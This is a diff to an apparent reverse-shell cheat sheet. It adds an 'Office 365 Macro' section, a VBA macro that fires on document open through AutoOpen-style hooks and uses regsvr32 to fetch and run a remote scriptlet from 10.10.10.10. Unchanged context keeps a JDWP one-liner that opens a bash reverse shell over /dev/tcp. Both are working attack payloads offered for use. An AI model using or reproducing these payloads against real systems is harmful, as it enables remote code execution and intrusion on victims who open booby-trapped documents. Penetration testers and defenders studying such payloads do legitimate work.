@@ -25,6 +25,7 @@ Basic reverse shells for any scenario
 - Golang
 - jsonpickle 
 - JDWP 
+- Office 365 Macro
 
 
 # Python
@@ -516,6 +517,35 @@ If netcat is installed
 # JDWP 
 ```
 print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("/bin/bash-c 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'").getInputStream())).readLine())
+```
+# Office 365 Macro
+```
+Private Sub Document_Open()
+Test
+End Sub
+
+Private Sub DocumentOpen()
+Test
+End Sub
+
+Private Sub Auto_Open()
+Test
+End Sub
+
+Private Sub AutoOpen()
+Test
+End Sub
+
+Private Sub Auto_Exec()
+Test
+End Sub
+
+Private Sub Test()
+    Dim shell
+    Dim out
+    Set shell = VBA.CreateObject("WScript.Shell")
+    out = shell.Run("regsvr32 /u /n /s /i:http://10.10.10.10/rev.sct scrobj.dll", 0, False)
+End Sub
 ```
 
 
